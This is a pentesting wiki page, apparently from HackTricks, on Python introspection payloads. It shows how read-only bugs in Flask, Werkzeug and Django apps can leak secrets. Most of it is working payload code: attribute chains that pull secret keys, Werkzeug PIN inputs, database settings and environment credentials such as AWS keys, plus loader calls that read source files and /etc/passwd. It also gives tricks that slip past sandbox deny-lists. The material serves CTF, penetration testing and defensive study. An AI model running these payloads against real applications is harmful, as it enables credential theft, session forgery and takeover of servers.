# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

Different vulnerabilities such as [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) or [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) might allow you to **read python internal data but won't allow you to execute code**. Therefore, a pentester will need to make the most of these read permissions to **obtain sensitive privileges and escalate the vulnerability**.

### Flask - Read secret key

The main page of a Flask application will probably have the **`app`** global object where this **secret is configured**.

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

In this case it's possible to access this object just using any gadget to **access global objects** from the [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

In the case where **the vulnerability is in a different python file**, you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

A payload like this one [from this writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>

```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

Use this payload to **read `app.secret_key`**. If the original bug also gives you a write primitive (for example, class pollution), the same path can be used to replace it and sign more privileged Flask cookies.

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) you will be able to access the **machine_id** and the **uuid** node, which are the **private bits** you need to [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) and access the python console in `/console` if the **debug mode is enabled**:<sup>[[4]](#references)</sup>

```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```

> [!WARNING]
> Note that you can get the **servers local path to the `app.py`** generating some **error** in the web page which will **give you the path**.

If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.

### Django - SECRET_KEY and settings module

The Django settings object is cached in `sys.modules` once the application starts. With only read primitives you can leak the **`SECRET_KEY`**, fallback keys, database credentials or signing salts:

```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
 a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```

If the vulnerable gadget is in another module, walk globals first:

```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```

`SECRET_KEY_FALLBACKS` are just as valuable as the current `SECRET_KEY`: they still validate old signed values during rotation.<sup>[[1]](#references)</sup> Also leak `SESSION_ENGINE` and `SESSION_SERIALIZER` to quickly determine whether the impact is only cookie forgery or something stronger. For the web impact details, check the [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - read source code and files

Loaded Python modules usually keep a `__loader__`. File-backed loaders frequently expose `get_source()` and `get_data()`, which are perfect **read-only primitives** when you can already reach a module object but not `open()`:

```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```

This is very useful to dump **config modules, blueprints, helper files or hidden routes** and recover API keys, DSNs, flag paths or additional gadget entry points.

If you only have subclass enumeration, search the loader by name instead of hard-coding an index:

```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```

### Generator / coroutine frame globals

If you can create or reach a generator/coroutine object, its frame can leak globals **without needing any function `__globals__` gadget**. This is useful against filters that only block dunder names and forget frame attributes such as `gi_frame`, `ag_frame`, `cr_frame` or `f_globals`:

```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```

Once you have the frame globals, continue exactly as in the other gadgets (`sys.modules`, settings objects, `os.environ`, etc.). Recent sandbox escapes keep rediscovering this because `gi_frame` and `f_globals` are not dunder attributes and often survive naive deny-lists.

### Environment variables / cloud creds via loaded modules

Many jails still import `os` or `sys` somewhere. You can abuse any reachable function `__init__.__globals__` to pivot to the already-imported `os` module and dump **environment variables** containing API tokens, cloud keys or flags:

```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```

If the subclass index is filtered, use loaders:

```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```

Environment variables are frequently the only secrets needed to move from read to full compromise (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), affected versions `<0.61.0`) allowed **class pollution** through crafted component requests. A property path such as `__init__.__globals__` could reach component-module globals and imported modules; the advisory demonstrates overwriting Django's `SECRET_KEY` and values in `os.environ`, rather than a read-only exploit.<sup>[[5]](#references)</sup> If a separate bug provides read access to the same object graph, those globals may expose configuration and credentials without requiring code execution.

### Gadget collections for chaining

Recent CTFs and pyjail research show reliable read chains built only with attribute access and subclass enumeration. Community-maintained lists such as [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) catalog hundreds of minimal gadgets you can combine to traverse from objects to `__globals__`, `sys.modules` and finally sensitive data.<sup>[[2]](#references)</sup> Prefer **attribute/name based searches** over raw subclass indexes because the position of `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. changes between Python versions and with extra imported libraries.

## References

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
